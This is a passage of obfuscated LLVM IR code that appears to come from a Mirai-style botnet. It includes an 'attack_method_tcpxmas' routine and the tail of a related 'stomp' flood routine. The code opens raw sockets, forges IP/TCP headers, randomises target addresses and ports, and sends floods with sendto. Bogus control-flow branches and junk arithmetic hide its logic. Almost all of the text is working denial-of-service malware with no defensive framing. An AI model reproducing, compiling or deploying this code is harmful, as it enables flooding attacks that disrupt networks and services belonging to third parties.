  %867 = load i32, i32* %9, align 4
  %868 = sext i32 %867 to i64
  %869 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %866, i64 %868
  %870 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %869, i32 0, i32 0
  %871 = bitcast %struct.sockaddr_in* %870 to %struct.sockaddr*
  store %struct.sockaddr* %871, %struct.sockaddr** %865, align 8
  %872 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %873 = load %struct.sockaddr*, %struct.sockaddr** %872, align 8
  %874 = call i64 @sendto(i32 %860, i8* %861, i64 %864, i32 16384, %struct.sockaddr* %873, i32 16)
  br label %875

; <label>:875:                                    ; preds = %803
  %876 = load i32, i32* @x.29
  %877 = load i32, i32* @y.30
  %878 = sub i32 %876, 1
  %879 = mul i32 %876, %878
  %880 = urem i32 %879, 2
  %881 = icmp eq i32 %880, 0
  %882 = icmp slt i32 %877, 10
  %883 = or i1 %881, %882
  br i1 %883, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %875
  %884 = load i32, i32* %9, align 4
  %885 = add nsw i32 %884, 1
  store i32 %885, i32* %9, align 4
  %886 = load i32, i32* @x.29
  %887 = load i32, i32* @y.30
  %888 = sub i32 %886, 1
  %889 = mul i32 %886, %888
  %890 = urem i32 %889, 2
  %891 = icmp eq i32 %890, 0
  %892 = icmp slt i32 %887, 10
  %893 = or i1 %891, %892
  br i1 %893, label %originalBBpart2150, label %originalBB140alteredBB

originalBBpart2150:                               ; preds = %originalBB140
  br label %753

; <label>:894:                                    ; preds = %originalBBpart2138
  br label %736

; <label>:895:                                    ; preds = %282, %127, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %105
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %137
  %896 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %896, i32* %26, align 4
  %897 = icmp eq i32 %896, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %156
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %222
  %898 = call i32 @rand_next()
  %_ = sub i32 0, %898
  %gen = add i32 %_, 65535
  %_11 = sub i32 0, %898
  %gen12 = add i32 %_11, 65535
  %_13 = sub i32 0, %898
  %gen14 = add i32 %_13, 65535
  %_15 = shl i32 %898, 65535
  %_16 = sub i32 0, %898
  %gen17 = add i32 %_16, 65535
  %_18 = sub i32 %898, 65535
  %gen19 = mul i32 %_18, 65535
  %_20 = shl i32 %898, 65535
  %_21 = sub i32 0, %898
  %gen22 = add i32 %_21, 65535
  %899 = and i32 %898, 65535
  %900 = trunc i32 %899 to i16
  %901 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %900, i16* %901, align 2
  br label %originalBB10

originalBB26alteredBB:                            ; preds = %originalBB26, %255
  store i32 16, i32* %29, align 4
  %902 = load i32, i32* %10, align 4
  %903 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %904 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %905 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %905, %struct.sockaddr** %904, align 8
  %906 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %907 = load %struct.sockaddr*, %struct.sockaddr** %906, align 8
  %908 = call i64 @recvfrom(i32 %902, i8* %903, i64 256, i32 16384, %struct.sockaddr* %907, i32* %29)
  %909 = trunc i64 %908 to i32
  store i32 %909, i32* %33, align 4
  %910 = load i32, i32* %33, align 4
  %911 = icmp eq i32 %910, -1
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %283
  %912 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %913 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %912, i32 0, i32 0
  %914 = load i32, i32* %913, align 4
  %915 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %916 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %915, i32 0, i32 0
  %917 = load i32, i32* %916, align 4
  %918 = icmp eq i32 %914, %917
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %307
  %919 = load i32, i32* %33, align 4
  %920 = sext i32 %919 to i64
  %921 = icmp ugt i64 %920, 40
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %327
  %922 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %923 = getelementptr inbounds i8, i8* %922, i64 20
  %924 = bitcast i8* %923 to %struct.tcphdr*
  store %struct.tcphdr* %924, %struct.tcphdr** %35, align 8
  %925 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %926 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %925, i32 0, i32 0
  %927 = load i16, i16* %926, align 4
  %928 = zext i16 %927 to i32
  %929 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %930 = load i16, i16* %929, align 2
  %931 = zext i16 %930 to i32
  %932 = icmp eq i32 %928, %931
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %371
  %933 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %934 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %933, i32 0, i32 0
  %935 = load i32, i32* %934, align 4
  %936 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %937 = load i32, i32* %9, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %936, i64 %938
  %940 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %939, i32 0, i32 0
  store i32 %935, i32* %940, align 4
  %941 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %942 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %941, i32 0, i32 2
  %943 = load i32, i32* %942, align 4
  %944 = call i32 @ntohl(i32 %943) #7
  %945 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %946 = load i32, i32* %9, align 4
  %947 = sext i32 %946 to i64
  %948 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %945, i64 %947
  %949 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %948, i32 0, i32 1
  store i32 %944, i32* %949, align 4
  %950 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %951 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %950, i32 0, i32 3
  %952 = load i32, i32* %951, align 4
  %953 = call i32 @ntohl(i32 %952) #7
  %954 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %955 = load i32, i32* %9, align 4
  %956 = sext i32 %955 to i64
  %957 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %954, i64 %956
  %958 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %957, i32 0, i32 2
  store i32 %953, i32* %958, align 4
  %959 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %960 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %959, i32 0, i32 1
  %961 = load i16, i16* %960, align 2
  %962 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %963 = load i32, i32* %9, align 4
  %964 = sext i32 %963 to i64
  %965 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %962, i64 %964
  %966 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %965, i32 0, i32 3
  store i16 %961, i16* %966, align 4
  %967 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %968 = load i16, i16* %967, align 2
  %969 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %970 = load i32, i32* %9, align 4
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %969, i64 %971
  %973 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %972, i32 0, i32 4
  store i16 %968, i16* %973, align 2
  %974 = load i32, i32* %24, align 4
  %975 = sext i32 %974 to i64
  %_43 = sub i64 0, 40
  %gen44 = add i64 %_43, %975
  %976 = add i64 40, %975
  %977 = call noalias i8* @malloc(i64 %976) #6
  %978 = load i8**, i8*** %12, align 8
  %979 = load i32, i32* %9, align 4
  %980 = sext i32 %979 to i64
  %981 = getelementptr inbounds i8*, i8** %978, i64 %980
  store i8* %977, i8** %981, align 8
  %982 = load i8**, i8*** %12, align 8
  %983 = load i32, i32* %9, align 4
  %984 = sext i32 %983 to i64
  %985 = getelementptr inbounds i8*, i8** %982, i64 %984
  %986 = load i8*, i8** %985, align 8
  %987 = bitcast i8* %986 to %struct.iphdr*
  store %struct.iphdr* %987, %struct.iphdr** %36, align 8
  %988 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %989 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %988, i64 1
  %990 = bitcast %struct.iphdr* %989 to %struct.tcphdr*
  store %struct.tcphdr* %990, %struct.tcphdr** %37, align 8
  %991 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %992 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %991, i64 1
  %993 = bitcast %struct.tcphdr* %992 to i8*
  store i8* %993, i8** %38, align 8
  %994 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %995 = bitcast %struct.iphdr* %994 to i8*
  %996 = load i8, i8* %995, align 4
  %_45 = sub i8 %996, 15
  %gen46 = mul i8 %_45, 15
  %_47 = shl i8 %996, 15
  %_48 = sub i8 0, %996
  %gen49 = add i8 %_48, 15
  %_50 = sub i8 %996, 15
  %gen51 = mul i8 %_50, 15
  %_52 = shl i8 %996, 15
  %_53 = shl i8 %996, 15
  %_54 = sub i8 0, %996
  %gen55 = add i8 %_54, 15
  %997 = and i8 %996, 15
  %_56 = sub i8 0, %997
  %gen57 = add i8 %_56, 64
  %_58 = sub i8 %997, 64
  %gen59 = mul i8 %_58, 64
  %_60 = sub i8 %997, 64
  %gen61 = mul i8 %_60, 64
  %_62 = sub i8 0, %997
  %gen63 = add i8 %_62, 64
  %_64 = sub i8 %997, 64
  %gen65 = mul i8 %_64, 64
  %_66 = shl i8 %997, 64
  %998 = or i8 %997, 64
  store i8 %998, i8* %995, align 4
  %999 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %1000 = bitcast %struct.iphdr* %999 to i8*
  %1001 = load i8, i8* %1000, align 4
  %_67 = sub i8 %1001, -16
  %gen68 = mul i8 %_67, -16
  %_69 = shl i8 %1001, -16
  %_70 = sub i8 0, %1001
  %gen71 = add i8 %_70, -16
  %_72 = sub i8 %1001, -16
  %gen73 = mul i8 %_72, -16
  %1002 = and i8 %1001, -16
  %_74 = sub i8 0, %1002
  %gen75 = add i8 %_74, 5
  %1003 = or i8 %1002, 5
  store i8 %1003, i8* %1000, align 4
  %1004 = load i8, i8* %13, align 1
  %1005 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %1006 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1005, i32 0, i32 1
  store i8 %1004, i8* %1006, align 1
  %1007 = load i32, i32* %24, align 4
  %1008 = sext i32 %1007 to i64
  %_76 = sub i64 40, %1008
  %gen77 = mul i64 %_76, %1008
  %_78 = sub i64 40, %1008
  %gen79 = mul i64 %_78, %1008
  %_80 = sub i64 40, %1008
  %gen81 = mul i64 %_80, %1008
  %1009 = add i64 40, %1008
  %1010 = trunc i64 %1009 to i16
  %1011 = call zeroext i16 @htons(i16 zeroext %1010) #7
  %1012 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %1013 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1012, i32 0, i32 2
  store i16 %1011, i16* %1013, align 2
  %1014 = load i16, i16* %14, align 2
  %1015 = call zeroext i16 @htons(i16 zeroext %1014) #7
  %1016 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %1017 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1016, i32 0, i32 3
  store i16 %1015, i16* %1017, align 4
  %1018 = load i8, i8* %15, align 1
  %1019 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %1020 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1019, i32 0, i32 5
  store i8 %1018, i8* %1020, align 4
  %1021 = load i8, i8* %16, align 1
  %1022 = icmp ne i8 %1021, 0
  br label %originalBB42

originalBB85alteredBB:                            ; preds = %originalBB85, %612
  %1023 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %1024 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1023, i32 0, i32 4
  %1025 = load i16, i16* %1024, align 4
  %_86 = sub i16 0, %1025
  %gen87 = add i16 %_86, 10
  %_88 = sub i16 0, %1025
  %gen89 = add i16 %_88, 10
  %_90 = sub i16 0, %1025
  %gen91 = add i16 %_90, 10
  %_92 = sub i16 %1025, 10
  %gen93 = mul i16 %_92, 10
  %_94 = sub i16 0, %1025
  %gen95 = add i16 %_94, 10
  %_96 = sub i16 %1025, 10
  %gen97 = mul i16 %_96, 10
  %_98 = shl i16 %1025, 10
  %1026 = lshr i16 %1025, 10
  %_99 = sub i16 %1026, 1
  %gen100 = mul i16 %_99, 1
  %_101 = shl i16 %1026, 1
  %_102 = sub i16 0, %1026
  %gen103 = add i16 %_102, 1
  %_104 = shl i16 %1026, 1
  %_105 = sub i16 %1026, 1
  %gen106 = mul i16 %_105, 1
  %_107 = sub i16 %1026, 1
  %gen108 = mul i16 %_107, 1
  %1027 = and i16 %1026, 1
  %1028 = zext i16 %1027 to i32
  %1029 = icmp ne i32 %1028, 0
  br label %originalBB85

originalBB112alteredBB:                           ; preds = %originalBB112, %636
  %1030 = load i32, i32* %26, align 4
  %1031 = call i32 @close(i32 %1030)
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %655
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %672
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %699
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %719
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %736
  store i32 0, i32* %9, align 4
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %753
  %1032 = load i32, i32* %9, align 4
  %1033 = load i8, i8* %5, align 1
  %1034 = zext i8 %1033 to i32
  %1035 = icmp slt i32 %1032, %1034
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %875
  %1036 = load i32, i32* %9, align 4
  %_141 = sub i32 %1036, 1
  %gen142 = mul i32 %_141, 1
  %_143 = sub i32 0, %1036
  %gen144 = add i32 %_143, 1
  %_145 = shl i32 %1036, 1
  %_146 = sub i32 %1036, 1
  %gen147 = mul i32 %_146, 1
  %_148 = shl i32 %1036, 1
  %1037 = add nsw i32 %1036, 1
  store i32 %1037, i32* %9, align 4
  br label %originalBB140
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %122

; <label>:105:                                    ; preds = %4
  %106 = load i32, i32* @x.31
  %107 = load i32, i32* @y.32
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %105
  %114 = load i32, i32* @x.31
  %115 = load i32, i32* @y.32
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %847

; <label>:122:                                    ; preds = %4
  %123 = load i32, i32* @x.31
  %124 = load i32, i32* @y.32
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %122
  store i32 1, i32* %9, align 4
  %131 = load i32, i32* %10, align 4
  %132 = bitcast i32* %9 to i8*
  %133 = call i32 @setsockopt(i32 %131, i32 0, i32 3, i8* %132, i32 4) #6
  %134 = icmp eq i32 %133, -1
  %135 = load i32, i32* @x.31
  %136 = load i32, i32* @y.32
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %134, label %143, label %162

; <label>:143:                                    ; preds = %originalBBpart24
  %144 = load i32, i32* @x.31
  %145 = load i32, i32* @y.32
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %143
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 %152)
  %154 = load i32, i32* @x.31
  %155 = load i32, i32* @y.32
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %847

; <label>:162:                                    ; preds = %originalBBpart24
  store i32 0, i32* %9, align 4
  br label %163

; <label>:163:                                    ; preds = %668, %162
  %164 = load i32, i32* %9, align 4
  %165 = load i8, i8* %5, align 1
  %166 = zext i8 %165 to i32
  %167 = icmp slt i32 %164, %166
  br i1 %167, label %168, label %671

; <label>:168:                                    ; preds = %163
  %169 = load i32, i32* @x.31
  %170 = load i32, i32* @y.32
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %168
  %177 = load i32, i32* @x.31
  %178 = load i32, i32* @y.32
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %185

; <label>:185:                                    ; preds = %originalBBpart261, %604, %originalBBpart212
  %186 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %186, i32* %26, align 4
  %187 = icmp eq i32 %186, -1
  br i1 %187, label %188, label %189

; <label>:188:                                    ; preds = %185
  br label %668

; <label>:189:                                    ; preds = %185
  %190 = load i32, i32* %26, align 4
  %191 = load i32, i32* %26, align 4
  %192 = call i32 (i32, i32, ...) @fcntl(i32 %191, i32 3, i32 0)
  %193 = or i32 %192, 2048
  %194 = call i32 (i32, i32, ...) @fcntl(i32 %190, i32 4, i32 %193)
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %195, align 4
  %196 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i32 0, i32 2
  %201 = load i8, i8* %200, align 4
  %202 = zext i8 %201 to i32
  %203 = icmp slt i32 %202, 32
  br i1 %203, label %204, label %225

; <label>:204:                                    ; preds = %189
  %205 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %206 = load i32, i32* %9, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i64 %207
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i32 0, i32 1
  %210 = load i32, i32* %209, align 4
  %211 = call i32 @ntohl(i32 %210) #7
  %212 = call i32 @rand_next()
  %213 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %214 = load i32, i32* %9, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %213, i64 %215
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i32 0, i32 2
  %218 = load i8, i8* %217, align 4
  %219 = zext i8 %218 to i32
  %220 = lshr i32 %212, %219
  %221 = add i32 %211, %220
  %222 = call i32 @htonl(i32 %221) #7
  %223 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %224 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %223, i32 0, i32 0
  store i32 %222, i32* %224, align 4
  br label %234

; <label>:225:                                    ; preds = %189
  %226 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %227 = load i32, i32* %9, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %226, i64 %228
  %230 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i32 0, i32 1
  %231 = load i32, i32* %230, align 4
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %233 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %232, i32 0, i32 0
  store i32 %231, i32* %233, align 4
  br label %234

; <label>:234:                                    ; preds = %225, %204
  %235 = load i16, i16* %17, align 2
  %236 = zext i16 %235 to i32
  %237 = icmp eq i32 %236, 65535
  br i1 %237, label %238, label %243

; <label>:238:                                    ; preds = %234
  %239 = call i32 @rand_next()
  %240 = and i32 %239, 65535
  %241 = trunc i32 %240 to i16
  %242 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %241, i16* %242, align 2
  br label %247

; <label>:243:                                    ; preds = %234
  %244 = load i16, i16* %17, align 2
  %245 = call zeroext i16 @htons(i16 zeroext %244) #7
  %246 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %245, i16* %246, align 2
  br label %247

; <label>:247:                                    ; preds = %243, %238
  %248 = load i32, i32* @x.31
  %249 = load i32, i32* @y.32
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %247
  %256 = load i32, i32* %26, align 4
